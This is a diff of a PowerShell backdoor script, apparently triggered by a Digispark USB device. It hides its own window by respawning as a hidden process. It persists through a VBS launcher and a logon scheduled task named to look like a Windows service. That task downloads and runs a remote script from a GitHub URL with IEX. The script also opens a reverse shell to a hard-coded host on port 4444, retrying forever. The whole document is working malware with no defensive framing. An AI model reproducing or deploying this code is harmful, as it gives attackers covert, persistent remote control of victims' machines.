@@ -1,43 +1,36 @@
-# --- 1. IMMEDIATE PERSISTENCE (The Priority) ---
-# We install the Scheduled Task and the VBS launcher BEFORE we try to connect.
-# This ensures that even if the connection fails now, it will work in 60 seconds.
+# --- 1. THE INSTA-HIDE TRICK ---
+# If this is the visible 'parent' process, spawn a hidden 'child' and kill the parent immediately.
+if (!$env:GHOST_PROCESS) {
+    $env:GHOST_PROCESS = "TRUE"
+    Start-Process powershell.exe -WindowStyle Hidden -ArgumentList "-NoP -W Hidden -ExecutionPolicy Bypass -Command `"$((Get-Content $PSCommandPath) -join ';')`""
+    exit
+}
 
-$TaskName = "WindowsUpdateSync"
-$VBSPath = "$env:APPDATA\win_sys_helper.vbs"
+# --- 2. PERSISTENCE (Silent VBS & Task) ---
 $Url = "https://raw.githubusercontent.com/thegostman/happy/refs/heads/main/happy.ps1"
 $LHOST = "192.168.43.109"
 $LPORT = 4444
+$VBSPath = "$env:APPDATA\win_sys_helper.vbs"
 
-# Create the Silent VBS Launcher
-$VBSCode = @"
-Set WshShell = CreateObject("WScript.Shell")
-' The 0 hides the window, the False means don't wait for it to finish
-WshShell.Run "powershell.exe -NoP -W Hidden -Exec Bypass -Command IEX(New-Object Net.WebClient).DownloadString('$Url')", 0, False
-"@
+# Create the VBS (This runs with 0 visibility)
+$VBSCode = "Set W=CreateObject('WScript.Shell'):W.Run 'powershell -NoP -W Hidden -E Bypass -C IEX(New-Object Net.WebClient).DownloadString(''$Url'')',0,False"
 Set-Content -Path $VBSPath -Value $VBSCode -Force
 
-# Register the Scheduled Task (Runs every time anyone logs in)
-if (!(Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue)) {
+# Register Scheduled Task (If not exists)
+if (!(Get-ScheduledTask -TaskName "WindowsSysSync" -ErrorAction SilentlyContinue)) {
     $Action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$VBSPath`""
     $Trigger = New-ScheduledTaskTrigger -AtLogOn
-    $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
-    Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -Force
+    Register-ScheduledTask -TaskName "WindowsSysSync" -Action $Action -Trigger $Trigger -Force
 }
 
-# --- 2. THE RE-ENTRY (Self-Backgrounding) ---
-# If this script was just run by the Digispark, we want it to spawn a 
-# permanent background process and let the Digispark process exit.
-
-# --- 3. THE BEACON LOOP (The Infinite Search) ---
-# This loop is now wrapped in a Try/Catch that never gives up.
+# --- 3. THE BEACON LOOP ---
 while($true) {
     try {
         $client = New-Object System.Net.Sockets.TCPClient($LHOST, $LPORT)
         $stream = $client.GetStream()
         $writer = New-Object System.IO.StreamWriter($stream); $writer.AutoFlush = $true
-        $writer.WriteLine("--- GHOST SYSTEM ONLINE ---")
+        $writer.WriteLine("--- GHOST ONLINE ---")
         $reader = New-Object System.IO.StreamReader($stream)
-        
         while($client.Connected) {
             $writer.Write("PS " + (Get-Location).Path + "> ")
             $line = $reader.ReadLine()
@@ -47,8 +40,5 @@ while($true) {
         }
         $client.Close()
     }
-    catch {
-        # If no listener is found, wait 10 seconds and try again forever.
-        Start-Sleep -Seconds 10
-    }
+    catch { Start-Sleep -Seconds 10 }
 }
